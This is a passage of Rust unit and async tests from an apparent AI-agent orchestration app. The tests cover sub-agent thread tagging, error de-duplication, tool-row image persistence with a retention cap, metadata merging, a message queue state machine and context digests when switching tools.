        // though app-server tags EVERY event (including mainline ones) with a
        // threadId. Only a DIFFERENT thread id is a genuine sub-agent.
        assert_eq!(branch_of(Some("lead-1".into()), "lead-1"), None);
        assert_eq!(
            branch_of(Some("sub-1".into()), "lead-1"),
            Some("sub-1".into())
        );
        // No raw thread at all (claude/exec/opencode; app-server's anonymous
        // error slot) — always mainline, regardless of the session's own id.
        assert_eq!(branch_of(None, "lead-1"), None);
    }

    #[test]
    fn text_row_content_omits_tag_when_mainline() {
        // Untagged output must be BYTE-IDENTICAL to pre-#99 rows: this is what
        // lets an old row (persisted before this feature existed) and a fresh
        // mainline row render through the exact same code path either side of
        // the upgrade — no migration, no schema bump.
        assert_eq!(text_row_content("hello", None), r#"{"text":"hello"}"#);
    }

    #[test]
    fn text_row_content_embeds_tag_when_branched() {
        let v: serde_json::Value =
            serde_json::from_str(&text_row_content("hi", Some("sub-1"))).unwrap();
        assert_eq!(v["text"], "hi");
        assert_eq!(v["agentThread"], "sub-1");
    }

    // ---- issue #97: anonymous-slot usage-limit double-render fix ----

    #[test]
    fn anonymous_slot_dup_catches_the_exact_repeat() {
        // The reported bug: an "error" notification lands the full message
        // first (buf goes empty -> the message), then turn/completed's error
        // text arrives with the SAME message — must be recognized as a repeat.
        assert!(is_anonymous_slot_duplicate(
            "usage limit reached",
            "usage limit reached"
        ));
    }

    #[test]
    fn anonymous_slot_dup_ignores_a_first_delta_into_an_empty_buffer() {
        // The very first delta on a freshly-opened row: nothing to repeat yet.
        assert!(!is_anonymous_slot_duplicate("", "usage limit reached"));
    }

    #[test]
    fn anonymous_slot_dup_does_not_eat_a_different_second_error() {
        // Two DISTINCT errors in the same turn (e.g. a transient reconnect
        // banner ahead of the real failure) must both survive.
        assert!(!is_anonymous_slot_duplicate(
            "Reconnecting to Codex…",
            "usage limit reached"
        ));
    }

    #[test]
    fn anonymous_slot_dup_matches_a_repeat_after_other_buffered_text() {
        // The repeat can follow OTHER already-buffered text, not just be the
        // whole buffer verbatim — `ends_with`, not `==`.
        assert!(is_anonymous_slot_duplicate(
            "Reconnecting to Codex…usage limit reached",
            "usage limit reached"
        ));
    }

    #[test]
    fn anonymous_slot_dup_ignores_whitespace_only_text() {
        assert!(!is_anonymous_slot_duplicate("usage limit reached", "   "));
        assert!(!is_anonymous_slot_duplicate("usage limit reached", ""));
    }

    fn test_tool_call(name: &str, collab_threads: Vec<String>) -> super::super::proto::ToolCall {
        super::super::proto::ToolCall {
            id: "call_1".into(),
            name: name.into(),
            input: serde_json::json!({}),
            summary: String::new(),
            output: None,
            is_error: false,
            collab_threads,
            images: Vec::new(),
        }
    }

    #[test]
    fn tool_row_content_omits_tags_for_ordinary_mainline_call() {
        // A mainline (non-branched, non-collab) tool row's content must be
        // exactly what it was before #99 — no agentThread, no collabThreads key
        // at all (not even `null`), so an old persisted row and a fresh one
        // parse identically.
        let call = test_tool_call("read_file", Vec::new());
        let v = tool_row_content(&call, None);
        assert_eq!(v["name"], "read_file");
        assert!(v.get("agentThread").is_none());
        assert!(v.get("collabThreads").is_none());
        // Same "present only when non-empty" contract for images.
        assert!(v.get("images").is_none());
    }

    /// A call that already carries images (no current dialect populates
    /// `ToolCall::images`, but `tool_row_content` must still honor it — the
    /// symmetric counterpart to `merge_tool_result_content_*` below) gets an
    /// `images` key; an image-less call gets none at all, matching
    /// `collabThreads`'s own "present only when non-empty" contract.
    #[test]
    fn tool_row_content_carries_images_when_the_call_has_any() {
        let call = super::super::proto::ToolCall {
            images: vec!["data:image/png;base64,QUJD".to_string()],
            ..test_tool_call("read_file", Vec::new())
        };
        let v = tool_row_content(&call, None);
        assert_eq!(v["images"], serde_json::json!(["data:image/png;base64,QUJD"]));
    }

    #[test]
    fn tool_row_content_tags_a_sub_agents_own_call() {
        // The exact review counterexample, from the OTHER side: the row itself
        // (e.g. a sub-agent's own read_file) carries agentThread so it can
        // never be confused with the lead's own mainline read_file.
        let call = test_tool_call("read_file", Vec::new());
        let v = tool_row_content(&call, Some("sub-1"));
        assert_eq!(v["agentThread"], "sub-1");
        assert!(v.get("collabThreads").is_none());
    }

    #[test]
    fn tool_row_content_carries_collab_threads_for_the_anchor_row() {
        // The collabAgentToolCall row ITSELF is mainline (issued by the lead —
        // no agentThread), but carries collabThreads so the frontend can anchor
        // that sub-agent's branch here.
        let call = test_tool_call("collabAgentToolCall", vec!["sub-1".into(), "sub-2".into()]);
        let v = tool_row_content(&call, None);
        assert!(v.get("agentThread").is_none());
        assert_eq!(v["collabThreads"], serde_json::json!(["sub-1", "sub-2"]));
    }

    fn test_tool_result(images: Vec<String>) -> super::super::proto::ToolResultItem {
        super::super::proto::ToolResultItem {
            id: "call_1".into(),
            output: "the output".into(),
            is_error: false,
            collab_threads: Vec::new(),
            images,
        }
    }

    /// `merge_tool_result_content`'s images half: a result carrying images
    /// writes the `images` key (present-only-when-non-empty, same contract as
    /// `tool_row_content`'s own images/collabThreads keys).
    #[test]
    fn merge_tool_result_content_writes_images_when_the_result_has_any() {
        let mut content = tool_row_content(&test_tool_call("Bash", Vec::new()), None);
        assert!(content.get("images").is_none(), "no images before merge");
        let item = test_tool_result(vec!["data:image/png;base64,QUJD".to_string()]);
        merge_tool_result_content(&mut content, &item);
        assert_eq!(content["output"], "the output");
        assert_eq!(content["images"], serde_json::json!(["data:image/png;base64,QUJD"]));
    }

    /// The result's images OVERRIDE the call side, exactly like `output` does
    /// — never appended/merged, and an empty result REMOVES whatever the call
    /// side had, so a stale call-side stub can't survive into the terminal
    /// row. This is the deliberately asymmetric choice vs. `collabThreads`
    /// (see `merge_tool_result_content`'s doc for why the two differ).
    #[test]
    fn merge_tool_result_content_images_override_not_append_and_clear_when_empty() {
        // The call side already had an image (hypothetical — no current dialect
        // populates ToolCall::images, but the row's content JSON can still carry
        // a stale key from some other source).
        let mut content = serde_json::json!({
            "name": "Bash",
            "output": "",
            "is_error": false,
            "images": ["data:image/png;base64,STALE"],
        });
        // A result with a DIFFERENT image replaces it — not appends.
        let replaced = test_tool_result(vec!["data:image/png;base64,NEW".to_string()]);
        merge_tool_result_content(&mut content, &replaced);
        assert_eq!(content["images"], serde_json::json!(["data:image/png;base64,NEW"]));

        // A subsequent empty-images result (e.g. a different call id's row that
        // never had a real screenshot) clears the key entirely rather than
        // leaving the previous result's images stranded on it.
        let empty = test_tool_result(Vec::new());
        merge_tool_result_content(&mut content, &empty);
        assert!(content.get("images").is_none());
    }

    /// Pre-existing merge behavior (output/is_error/collabThreads) must be
    /// unchanged by the images work — regression guard for the refactor into
    /// `merge_tool_result_content`.
    #[test]
    fn merge_tool_result_content_keeps_existing_output_and_collab_threads_behavior() {
        let mut content = tool_row_content(&test_tool_call("collabAgentToolCall", Vec::new()), None);
        let item = super::super::proto::ToolResultItem {
            id: "call_1".into(),
            output: "done".into(),
            is_error: true,
            collab_threads: vec!["sub-1".into()],
            images: Vec::new(),
        };
        merge_tool_result_content(&mut content, &item);
        assert_eq!(content["output"], "done");
        assert_eq!(content["is_error"], true);
        assert_eq!(content["collabThreads"], serde_json::json!(["sub-1"]));
        assert!(content.get("images").is_none());
    }

    // —— bounded inline-image-row retention ——

    fn inline_row(id: i32) -> (i32, bool, serde_json::Value) {
        (id, false, serde_json::json!({"images": [format!("data:image/png;base64,img{id}")]}))
    }

    /// Pushing one row past the cap evicts exactly the OLDEST one, in FIFO
    /// order — the surviving queue holds the `MAX_INLINE_IMAGE_ROWS` most
    /// recent rows, oldest-of-survivors first.
    #[test]
    fn track_inline_image_row_evicts_the_oldest_once_over_the_cap() {
        let mut rows = std::collections::VecDeque::new();
        let mut evicted_ids = Vec::new();
        for i in 0..(MAX_INLINE_IMAGE_ROWS as i32 + 2) {
            let (next_rows, evicted) = track_inline_image_row(rows, inline_row(i));
            rows = next_rows;
            evicted_ids.extend(evicted.into_iter().map(|(id, _, _)| id));
        }
        assert_eq!(rows.len(), MAX_INLINE_IMAGE_ROWS);
        assert_eq!(evicted_ids, vec![0, 1], "the two oldest (ids 0 and 1) must be evicted, in order");
        let surviving_ids: Vec<i32> = rows.iter().map(|(id, _, _)| *id).collect();
        assert_eq!(
            surviving_ids,
            (2..(MAX_INLINE_IMAGE_ROWS as i32 + 2)).collect::<Vec<_>>(),
            "survivors are the MOST RECENT rows, in insertion order"
        );
    }

    /// Under the cap, nothing is evicted at all.
    #[test]
    fn track_inline_image_row_evicts_nothing_under_the_cap() {
        let mut rows = std::collections::VecDeque::new();
        for i in 0..MAX_INLINE_IMAGE_ROWS as i32 {
            let (next_rows, evicted) = track_inline_image_row(rows, inline_row(i));
            rows = next_rows;
            assert!(evicted.is_empty(), "must not evict while at or under the cap");
        }
        assert_eq!(rows.len(), MAX_INLINE_IMAGE_ROWS);
    }

    /// the DB-write-path cap is what actually
    /// bounds persisted inline images — unlike `inner.inline_image_rows`
    /// (this engine's own in-memory queue, empty again on every restart),
    /// `enforce_durable_inline_image_cap_db` is called with NO in-memory
    /// state carried between iterations here at all, standing in for a
    /// fresh engine (empty queue) running after every single write — i.e. a
    /// "restart" between every screenshot. The persisted count must still
    /// never exceed `MAX_INLINE_IMAGE_ROWS`. All rows here are the lead's own
    /// (`session_id: None`) — see the earlier P2 test below for the
    /// multi-session scoping this now enforces.
    #[tokio::test]
    async fn enforce_durable_inline_image_cap_db_bounds_persisted_inline_images_across_a_simulated_restart() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let ws = repo::create_workspace(&db, "ws").await.unwrap();
        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
            .await
            .unwrap();

        let n = MAX_INLINE_IMAGE_ROWS + 2;
        for i in 0..n {
            let content = serde_json::json!({
                "name": "computer",
                "summary": "screenshot",
                "input": {},
                "output": format!("/tmp/shot-{i}.png"),
                "is_error": false,
                "images": [format!("data:image/png;base64,img{i}")],
            });
            repo::insert_lead_message(
                &db,
                t.id,
                None,
                1,
                "assistant",
                "tool",
                &content.to_string(),
                "complete",
            )
            .await
            .unwrap();
            // No in-memory queue passed in at all — each call here is as
            // independent as if a brand-new engine (empty `inline_image_rows`)
            // ran after every single write, i.e. a "restart" in between each.
            enforce_durable_inline_image_cap_db(&db, t.id, None).await;
        }

        let messages = repo::list_lead_messages(&db, t.id).await.unwrap();
        assert_eq!(messages.len(), n, "no row is ever deleted, only its images key stripped");
        let with_images: Vec<&lead_message::Model> =
            messages.iter().filter(|m| m.content.contains("\"images\"")).collect();
        assert_eq!(
            with_images.len(),
            MAX_INLINE_IMAGE_ROWS,
            "persisted inline images must stay at the cap no matter how many restarts happen in between"
        );
        // The most recent write must still carry its own inline image.
        let last = messages.last().unwrap();
        assert!(
            last.content.contains("\"images\""),
            "the current call's own screenshot must stay inline: {}",
            last.content
        );
        // An older, evicted row keeps its `output` path text intact — only
        // the inline data URI is stripped, never the on-disk reference.
        let first = &messages[0];
        assert!(!first.content.contains("\"images\""));
        assert!(
            first.content.contains("shot-0.png"),
            "the path reference must survive the strip: {}",
            first.content
        );
    }

    /// a tool row that merely
    /// MENTIONS `"images"` below the top level (here inside its serialized
    /// `input`) must NOT count toward the retention limit. Before the fix, the
    /// bare-substring count inflated `keep_from` and could strip a genuine
    /// older screenshot even while fewer than `MAX_INLINE_IMAGE_ROWS` real
    /// image rows existed.
    #[tokio::test]
    async fn enforce_durable_inline_image_cap_db_ignores_non_top_level_images_mentions() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let ws = repo::create_workspace(&db, "ws").await.unwrap();
        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude").await.unwrap();

        // Exactly MAX_INLINE_IMAGE_ROWS genuine screenshots (top-level
        // `images`) — all belong under the cap and must be kept.
        for i in 0..MAX_INLINE_IMAGE_ROWS {
            let content = serde_json::json!({
                "name": "computer",
                "summary": "screenshot",
                "input": {},
                "output": format!("/tmp/real-{i}.png"),
                "is_error": false,
                "images": [format!("data:image/png;base64,real{i}")],
            });
            repo::insert_lead_message(&db, t.id, None, 1, "assistant", "tool", &content.to_string(), "complete")
                .await
                .unwrap();
        }
        // Two LATER rows that only MENTION "images" inside their `input` — no
        // top-level `images` key, nothing to strip. Under the old substring
        // count these padded the total to 6 → `keep_from` = 2 → the two OLDEST
        // genuine screenshots got stripped even though only 4 real ones exist.
        for i in 0..2 {
            let content = serde_json::json!({
                "name": "some_tool",
                "summary": "unrelated",
                "input": { "images": [format!("query-mention-{i}")] },
                "output": "done",
                "is_error": false,
            });
            repo::insert_lead_message(&db, t.id, None, 1, "assistant", "tool", &content.to_string(), "complete")
                .await
                .unwrap();
        }

        enforce_durable_inline_image_cap_db(&db, t.id, None).await;

        let messages = repo::list_lead_messages(&db, t.id).await.unwrap();
        let genuine_screenshots_kept = messages
            .iter()
            .filter(|m| {
                serde_json::from_str::<serde_json::Value>(&m.content)
                    .ok()
                    .and_then(|v| v.as_object().map(|o| o.contains_key("images")))
                    .unwrap_or(false)
            })
            .count();
        assert_eq!(
            genuine_screenshots_kept, MAX_INLINE_IMAGE_ROWS,
            "no genuine screenshot may be stripped when only non-top-level \"images\" mentions padded the count"
        );
        // The mention rows are left entirely untouched.
        assert!(
            messages.iter().any(|m| m.content.contains("query-mention-0")),
            "a non-image row's own content must be left intact"
        );
    }

    /// a thread hosting TWO sessions —
    /// the lead (`session_id: None`) and a chat-mode worker (`session_id:
    /// Some(7)`) — each writing more than `MAX_INLINE_IMAGE_ROWS` inline
    /// screenshots, must keep each session's OWN cap independently. Before
    /// this fix, `enforce_durable_inline_image_cap_db` pooled every
    /// session's tool rows into ONE shared retention queue keyed only by
    /// `thread_id`, so calling it while enforcing the lead's cap could strip
    /// images off the untouched worker's timeline (and vice versa). Here,
    /// only the worker's cap is ever invoked — the lead's rows must come out
    /// with every inline image still intact.
    #[tokio::test]
    async fn enforce_durable_inline_image_cap_db_scopes_the_cap_to_one_session() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let ws = repo::create_workspace(&db, "ws").await.unwrap();
        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
            .await
            .unwrap();
        // Post-merge with main's workspace-fence governance,
        // `insert_lead_message` refuses a session with no writable
        // thread/direction/repo owner — so the worker session must be REAL
        // rows, not a synthetic id.
        let repo_ref = repo::add_repo_ref(&db, ws.id, "api", "/tmp/img-cap-repo", "main", "", true)
            .await
            .unwrap();
        let direction = repo::create_direction(
            &db,
            t.id,
            "impl",
            "claude",
            repo_ref.id,
            "why",
            "impl-only",
            "",
        )
        .await
        .unwrap();
        let session = repo::create_session(&db, direction.id, repo_ref.id, "claude", "/tmp/img-cap-wt")
            .await
            .unwrap();

        let worker_session_id = Some(session.id);
        let n = MAX_INLINE_IMAGE_ROWS + 2;

        // The lead writes its own screenshots first — session_id: None.
        for i in 0..n {
            let content = serde_json::json!({
                "name": "computer",
                "summary": "screenshot",
                "input": {},
                "output": format!("/tmp/lead-shot-{i}.png"),
                "is_error": false,
                "images": [format!("data:image/png;base64,lead-img{i}")],
            });
            repo::insert_lead_message(
                &db,
                t.id,
                None,
                1,
                "assistant",
                "tool",
                &content.to_string(),
                "complete",
            )
            .await
            .unwrap();
        }

        // The worker (session_id: Some(7)) then writes its own screenshots,
        // enforcing ONLY its own cap after each one — the lead's cap is never
        // invoked here at all.
        for i in 0..n {
            let content = serde_json::json!({
                "name": "computer",
                "summary": "screenshot",
                "input": {},
                "output": format!("/tmp/worker-shot-{i}.png"),
                "is_error": false,
                "images": [format!("data:image/png;base64,worker-img{i}")],
            });
            repo::insert_lead_message(
                &db,
                t.id,
                worker_session_id,
                1,
                "assistant",
                "tool",
                &content.to_string(),
                "complete",
            )
            .await
            .unwrap();
            enforce_durable_inline_image_cap_db(&db, t.id, worker_session_id).await;
        }

        let messages = repo::list_lead_messages(&db, t.id).await.unwrap();
        assert_eq!(messages.len(), 2 * n, "no row is ever deleted, only its images key stripped");

        let lead_rows: Vec<&lead_message::Model> =
            messages.iter().filter(|m| m.session_id.is_none()).collect();
        let worker_rows: Vec<&lead_message::Model> = messages
            .iter()
            .filter(|m| m.session_id == worker_session_id)
            .collect();
        assert_eq!(lead_rows.len(), n);
        assert_eq!(worker_rows.len(), n);

        let lead_with_images = lead_rows.iter().filter(|m| m.content.contains("\"images\"")).count();
        assert_eq!(
            lead_with_images, n,
            "the lead's timeline was never touched by the worker's cap enforcement — \
             every one of its inline images must survive intact"
        );

        let worker_with_images =
            worker_rows.iter().filter(|m| m.content.contains("\"images\"")).count();
        assert_eq!(
            worker_with_images, MAX_INLINE_IMAGE_ROWS,
            "the worker's OWN cap still applies to its own rows"
        );
    }

    /// PersistedMeta roundtrip + tolerance: apply restores every last_* field,
    /// while empty/corrupt JSON leaves the fresh engine untouched.
    #[test]
    fn persisted_meta_roundtrip_and_tolerance() {
        let snap = PersistedMeta {
            context_tokens: Some(57_000),
            window: Some(200_000),
            model: Some("claude-sonnet-4-5".into()),
            reasoning_effort: None,
            mcp_servers: vec![super::super::proto::McpServer {
                name: "context7".into(),
                status: "connected".into(),
            }],
            tools: vec!["mcp__context7__query-docs".into()],
        };
        let json = serde_json::to_string(&snap).unwrap();

        let mut inner = test_inner("claude");
        apply_persisted_meta(&mut inner, &json);
        assert_eq!(inner.last_context_tokens, Some(57_000));
        assert_eq!(inner.last_window, Some(200_000));
        assert_eq!(inner.last_model.as_deref(), Some("claude-sonnet-4-5"));
        assert_eq!(inner.last_mcp_servers.len(), 1);
        assert_eq!(inner.last_tools.len(), 1);

        // Empty and corrupt snapshots are silent no-ops.
        let mut fresh = test_inner("claude");
        apply_persisted_meta(&mut fresh, "");
        apply_persisted_meta(&mut fresh, "{not json");
        assert_eq!(fresh.last_context_tokens, None);
        assert!(fresh.last_mcp_servers.is_empty());

        // Old snapshots missing optional arrays still deserialize (serde defaults).
        let mut sparse = test_inner("claude");
        apply_persisted_meta(
            &mut sparse,
            r#"{"context_tokens":1,"window":2,"model":null}"#,
        );
        assert_eq!(sparse.last_context_tokens, Some(1));
        assert!(sparse.last_tools.is_empty());
    }

    /// merge_probe semantics: the freshest result may overwrite (usage only on
    /// probe-sourced transports); a stale result degrades to fill-a-hole for
    /// EVERY field — including MCP, so a late non-empty list can't resurrect
    /// servers a newer authoritative empty probe just cleared.
    #[test]
    fn merge_probe_usage_gate() {
        let mcp = |names: &[&str]| {
            names
                .iter()
                .map(|n| super::super::proto::McpServer {
                    name: (*n).into(),
                    status: "connected".into(),
                })
                .collect::<Vec<_>>()
        };
        let snap = crate::session_meta::SessionMetaSnapshot {
            context_tokens: Some(999),
            window: Some(200_000),
            model: Some("gpt-5.6-sol".into()),
            mcp_servers: Some(mcp(&["old-server"])),
            skills: None,
            reasoning_effort: None,
        };
        // Freshest + usage-from-events (claude/codex): usage fills a hole only.
        let mut hole = PersistedMeta::default();
        assert!(hole.merge_probe(&snap, true, true));
        assert_eq!(hole.context_tokens, Some(999));
        let mut known = PersistedMeta {
            context_tokens: Some(57_000),
            ..Default::default()
        };
        known.merge_probe(&snap, true, true);
        assert_eq!(
            known.context_tokens,
            Some(57_000),
            "eventful usage must not be overwritten"
        );
        assert_eq!(
            known.model.as_deref(),
            Some("gpt-5.6-sol"),
            "config updates when freshest"
        );
        // Freshest + probe-sourced usage (opencode): overwrites.
        let mut live = PersistedMeta {
            context_tokens: Some(57_000),
            ..Default::default()
        };
        assert!(live.merge_probe(&snap, true, false));
        assert_eq!(live.context_tokens, Some(999));
        // Stale: every field is fill-only — an authoritative empty MCP list
        // (user removed servers) survives a late non-empty result.
        let mut cleared = PersistedMeta {
            context_tokens: Some(57_000),
            window: Some(100_000),
            model: Some("kept".into()),
            reasoning_effort: None,
            mcp_servers: vec![],
            tools: vec![],
        };
        cleared.merge_probe(&snap, false, false);
        assert_eq!(cleared.context_tokens, Some(57_000));
        assert_eq!(cleared.model.as_deref(), Some("kept"));
        assert_eq!(cleared.window, Some(100_000));
        // MCP never moves on a stale result — an empty list may be a newer
        // probe's authoritative "user removed every server", so even a fill
        // would resurrect them.
        assert!(cleared.mcp_servers.is_empty(), "stale must not touch MCP");
        let mut populated = PersistedMeta {
            mcp_servers: mcp(&["new-server"]),
            ..Default::default()
        };
        populated.merge_probe(&snap, false, false);
        assert_eq!(populated.mcp_servers[0].name, "new-server");
        // Transport mapping.
        assert!(usage_events_authoritative("claude"));
        assert!(usage_events_authoritative("codex"));
        assert!(!usage_events_authoritative("opencode"));
    }

    /// A queued (undelivered) user edit of the test cases marks any in-flight
    /// lead emit as stale; ordinary queued messages do not.
    #[test]
    fn pending_user_test_update_detection() {
        let mk = |text: &str| Outgoing {
            text: text.into(),
            images: vec![],
            tracked: false,
            origin_tag: None,
            queue_id: None,
            has_attachments: false,
            local_image_paths: Vec::new(),
        };
        let mut turn = TurnState::default();
        assert!(!has_pending_user_test_update(&turn));
        turn.queue.push_back(mk("hello lead"));
        assert!(!has_pending_user_test_update(&turn));
        turn.queue
            .push_back(mk("<weft:test_cases_updated>{\"source\":\"user\",\"content\":\"# v\"}</weft:test_cases_updated>"));
        assert!(has_pending_user_test_update(&turn));
    }

    #[test]
    fn queue_machine() {
        let mut t = TurnState::default();
        assert!(t.try_begin_send()); // idle → busy: send through
        assert!(!t.try_begin_send()); // busy: enqueue
        t.queue.push_back(Outgoing {
            text: "second".into(),
            images: vec![],
            tracked: true,
            origin_tag: None,
            queue_id: None,
            has_attachments: false,
            local_image_paths: Vec::new(),
        });
        let next = t.on_turn_end();
        assert_eq!(next.map(|o| o.text).as_deref(), Some("second"));
        assert!(t.busy); // popped → still busy
        assert!(t.on_turn_end().is_none()); // empty queue → idle
        assert!(!t.busy);
    }

    #[test]
    fn quota_evidence_is_scoped_to_one_turn() {
        let mut turn = TurnState::default();
        assert!(turn.try_begin_send());
        turn.quota_exceeded = true;
        assert!(turn.on_turn_end().is_none());
        assert!(!turn.quota_exceeded);

        assert!(turn.try_begin_send());
        assert!(!turn.quota_exceeded);
    }

    #[test]
    fn structured_codex_exhaustion_snapshot_is_global_but_codex_only() {
        let previous = crate::engine_quota::QuotaSnapshot {
            tool: "codex".to_string(),
            status: crate::engine_quota::QuotaStatus::Warning,
            used_percent: Some(93),
            resets_at: Some(crate::engine_quota::now_unix() + 3600),
            window_label: Some("primary".to_string()),
            observed_at: crate::engine_quota::now_unix(),
        };
        let snapshot = structured_codex_exhaustion_snapshot("codex", Some(&previous)).unwrap();
        assert_eq!(snapshot.tool, "codex");
        assert_eq!(snapshot.status, crate::engine_quota::QuotaStatus::Exceeded);
        assert_eq!(snapshot.used_percent, Some(93));
        assert_eq!(snapshot.resets_at, previous.resets_at);
        assert_eq!(snapshot.window_label.as_deref(), Some("primary"));
        let empty = structured_codex_exhaustion_snapshot("codex", None).unwrap();
        assert_eq!(empty.used_percent, None);
        assert_eq!(empty.resets_at, None);
        assert_eq!(empty.window_label, None);
        assert!(structured_codex_exhaustion_snapshot("claude", None).is_none());
        assert!(structured_codex_exhaustion_snapshot("opencode", None).is_none());
    }

    #[test]
    fn quota_failover_requires_an_idle_failed_turn_boundary() {
        assert!(should_attempt_quota_failover("error", true, false));
        assert!(!should_attempt_quota_failover("error", true, true));
        assert!(!should_attempt_quota_failover("complete", true, false));
        assert!(!should_attempt_quota_failover("error", false, false));
    }

    #[test]
    fn bus_read_coalesces_into_one_trailing_turn() {
        let mut t = TurnState::default();
        assert!(t.try_begin_send()); // idle → busy
                                     // Several wakes during the turn collapse into one pending read.
        assert!(!t.request_bus_read());
        assert!(!t.request_bus_read());
        assert!(!t.request_bus_read());
        // Turn-end with an empty queue synthesizes exactly one invisible read.
        let read = t.on_turn_end().expect("a coalesced read turn");
        assert_eq!(read.text, BUS_WAKE_PROMPT);
        assert!(!read.tracked); // invisible plumbing, no timeline row
        assert!(t.busy); // the read turn keeps the engine busy
                         // No further pending read → the next turn-end goes idle.
        assert!(t.on_turn_end().is_none());
        assert!(!t.busy);
    }

    #[test]
    fn bus_read_runs_after_messages_queued_before_the_wake() {
        let mut t = TurnState::default();
        assert!(t.try_begin_send()); // busy
        t.queue.push_back(Outgoing {
            text: "earlier".into(),
            images: vec![],
            tracked: true,
            origin_tag: None,
            queue_id: None,
            has_attachments: false,
            local_image_paths: Vec::new(),
        });
        t.request_bus_read(); // wake lands AFTER "earlier" was queued
                              // "earlier" preceded the wake, so it drains first, then the read.
        assert_eq!(t.on_turn_end().map(|o| o.text).as_deref(), Some("earlier"));
        assert_eq!(
            t.on_turn_end().map(|o| o.text).as_deref(),
            Some(BUS_WAKE_PROMPT)
        );
        assert!(t.on_turn_end().is_none());
    }

    #[test]
    fn bus_read_precedes_messages_queued_after_the_wake() {
        let mut t = TurnState::default();
        assert!(t.try_begin_send()); // busy
        t.request_bus_read(); // wake lands first (queue empty → position 0)
        t.queue.push_back(Outgoing {
            text: "later".into(),
            images: vec![],
            tracked: true,
            origin_tag: None,
            queue_id: None,
            has_attachments: false,
            local_image_paths: Vec::new(),
        });
        // The wake arrived before "later", so the inbox read comes first — the
        // agent can't answer the newer prompt without seeing the bus message.
        assert_eq!(
            t.on_turn_end().map(|o| o.text).as_deref(),
            Some(BUS_WAKE_PROMPT)
        );
        assert_eq!(t.on_turn_end().map(|o| o.text).as_deref(), Some("later"));
        assert!(t.on_turn_end().is_none());
    }

    #[test]
    fn request_bus_read_on_idle_starts_a_turn() {
        let mut t = TurnState::default();
        assert!(t.request_bus_read()); // idle → caller starts a read turn now
        assert!(t.busy);
        assert!(t.bus_read_pos.is_none()); // consumed by starting the turn, not pending
    }

    #[test]
    fn queue_is_capped_at_max() {
        let mut t = TurnState::default();
        assert!(t.try_begin_send()); // idle → busy（占用一个在飞 turn）
        for i in 0..MAX_QUEUED {
            assert!(!t.try_begin_send()); // busy
            t.queue.push_back(Outgoing {
                text: format!("m{i}"),
                ..Default::default()
            });
        }
        assert_eq!(t.queue.len(), MAX_QUEUED);
        // Full-queue rejection (send() returning Err("queue_full")) is an async/DB path
        // not exercisable at the TurnState level; this test only asserts the queue fills
        // to exactly MAX_QUEUED.
    }

    #[test]
    fn codex_first_turn_prepends_prompt_only_on_new_thread() {
        // brand-new thread + non-empty prompt → prepended to the first message
        assert_eq!(codex_first_turn_text("SYS", "hello", false), "SYS\n\nhello");
        // resumed thread → prompt already in history, message unchanged
        assert_eq!(codex_first_turn_text("SYS", "hello", true), "hello");
        // no prompt → message unchanged even on a new thread
        assert_eq!(codex_first_turn_text("", "hello", false), "hello");
    }

    #[tokio::test]
    async fn clear_native_id_clears_the_lead_meta_row() {
        let db = Db::connect("sqlite::memory:").await.unwrap();
        let ws = repo::create_workspace(&db, "ws").await.unwrap();
        let t = repo::create_thread(&db, ws.id, "t", "feature", "claude")
            .await
            .unwrap();
        repo::set_lead_native_id(&db, t.id, "old-native")
            .await
            .unwrap();
        assert_eq!(
            repo::lead_native_id(&db, t.id).await.unwrap().as_deref(),
            Some("old-native")
        );

        clear_native_id(&db, None, t.id).await.unwrap();

        assert_eq!(repo::lead_native_id(&db, t.id).await.unwrap(), None);
        // Clearing again (no meta row left) is a harmless no-op.
        clear_native_id(&db, None, t.id).await.unwrap();
    }

    fn text_msg(role: &str, text: &str) -> lead_message::Model {
        text_msg_kind(
            role,
            "text",
            &serde_json::json!({ "text": text }).to_string(),
        )
    }

    fn text_msg_kind(role: &str, kind: &str, content: &str) -> lead_message::Model {
        lead_message::Model {
            id: 0,
            thread_id: 1,
            session_id: None,
            turn_id: 0,
            role: role.into(),
            kind: kind.into(),
            content: content.into(),
            status: "complete".into(),
            created_at: "0".into(),
            seq: None,
            native_anchor: None,
            consumed_at: None,
        }
    }

    #[test]
    fn switch_digest_empty_history_is_empty() {
        assert_eq!(build_switch_digest("claude", "codex", &[]), "");
        // Only non-text/system rows → still empty, not a digest with nothing in it.
        let rows = vec![text_msg_kind("system", "meta", "{}")];
        assert_eq!(build_switch_digest("claude", "codex", &rows), "");
    }

    #[test]
    fn switch_digest_carries_prior_turns_and_names_the_switch() {
        let rows = vec![
            text_msg("user", "please add login"),
            text_msg("assistant", "sure, starting now"),
        ];
        let d = build_switch_digest("claude", "codex", &rows);
        assert!(d.contains("claude → codex"), "names old and new tool: {d}");
        assert!(d.contains("User: please add login"));
        assert!(d.contains("Assistant: sure, starting now"));
        // Oldest-first: the user's turn precedes the assistant's in the digest.
        assert!(d.find("User: please add login") < d.find("Assistant: sure, starting now"));
    }

    #[test]
    fn switch_digest_same_tool_reads_as_reload_not_switch() {
        let rows = vec![text_msg("user", "hi")];
        let d = build_switch_digest("claude", "claude", &rows);
        assert!(d.contains("reloaded"), "same tool → reload phrasing: {d}");
        assert!(
            !d.contains("→"),
            "no switch arrow when the tool didn't change: {d}"
        );
    }

    #[test]
    fn switch_digest_skips_non_text_and_empty_rows() {
        let rows = vec![
            text_msg("user", "  "), // blank text after trim → skipped
            text_msg_kind("assistant", "tool", r#"{"name":"Bash","summary":"ls"}"#),
            text_msg("assistant", "here is the plan"),
        ];
        let d = build_switch_digest("claude", "codex", &rows);
        assert!(d.contains("here is the plan"));
        assert!(
            !d.contains("Bash"),
            "tool-kind rows are not part of the conversational digest"
        );
    }

    #[test]
    fn switch_digest_caps_turn_count_and_marks_omission() {
        let rows: Vec<_> = (0..20)
            .map(|i| text_msg("user", &format!("turn {i}")))
            .collect();
        let d = build_switch_digest("claude", "claude", &rows);
        assert!(d.contains("turn 19"), "keeps the most recent turns: {d}");
        assert!(
            !d.contains("turn 0\n"),
            "drops the oldest turns beyond the cap: {d}"
        );
        assert!(
            d.contains("earlier turn(s) omitted"),
            "says something was cut: {d}"
        );
    }

    #[test]
    fn switch_digest_caps_per_message_length() {
        let long = "x".repeat(2000);
        let rows = vec![text_msg("user", &long)];
        let d = build_switch_digest("claude", "codex", &rows);
        assert!(
            d.len() < long.len(),
